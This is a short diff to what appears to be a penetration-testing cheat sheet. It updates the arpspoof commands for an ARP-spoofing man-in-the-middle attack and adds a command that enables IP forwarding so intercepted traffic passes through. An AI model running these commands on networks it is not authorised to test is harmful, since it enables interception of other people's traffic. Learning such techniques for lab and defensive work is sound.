@@ -66,5 +66,8 @@ netdiscover -r <inet_ip>/24
 
 -> ARP Spoofing 
 arp -a
-arpspoof -i <interface> -t <target_victim> <target_router>
-arpspoof -i <interface> -t <target_router> <target_victim>
+arpspoof -i <interface> -t <clientIP> <gatewayIP>
+arpspoof -i <interface> -t <gatewayIP> <clientIP>
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+
